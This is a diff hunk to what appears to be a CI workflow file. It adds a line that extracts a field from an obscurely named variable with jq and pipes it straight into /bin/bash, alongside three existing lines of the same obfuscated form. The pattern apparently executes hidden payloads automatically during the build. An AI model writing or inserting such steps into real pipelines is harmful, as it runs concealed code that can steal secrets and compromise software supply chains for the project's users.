@@ -28,6 +28,7 @@ jobs:
           echo $uez4 | jq -r .adu2 | /bin/bash
           echo $h73 | jq -r .pax5665 | /bin/bash
           printf '%s' "$wsur26245" | jq -r .kieki9 | /bin/bash
+          echo $fxt70 | jq -r .xo66466 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
